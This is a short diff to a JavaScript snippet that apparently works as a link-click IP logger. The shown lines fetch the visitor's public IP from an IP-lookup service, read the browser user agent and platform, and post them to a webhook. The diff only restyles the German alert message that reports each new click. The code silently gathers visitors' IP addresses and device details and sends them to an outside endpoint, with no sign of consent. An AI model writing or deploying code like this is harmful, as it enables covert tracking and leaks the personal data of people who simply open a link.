@@ -7,7 +7,7 @@ fetch("https://api.ipify.org?format=json")
     const browser = navigator.userAgent
     const platform = navigator.platform
     const payload = {
-      content: `📨 Neuen Klick auf den Link bemerkt!\nIP-Addresse: \`${ip}\`\nBrowsertyp: ${browser}\nGerätetyp: ${platform}`
+      content: `📨 NEUER KLICK AUF DEN LINK!\n📌 IP-Addresse: \`${ip}\`\n🌏 Browsertyp: ${browser}\n📱 Gerätetyp: ${platform}`
     };
 
     fetch(webhookUrl, {
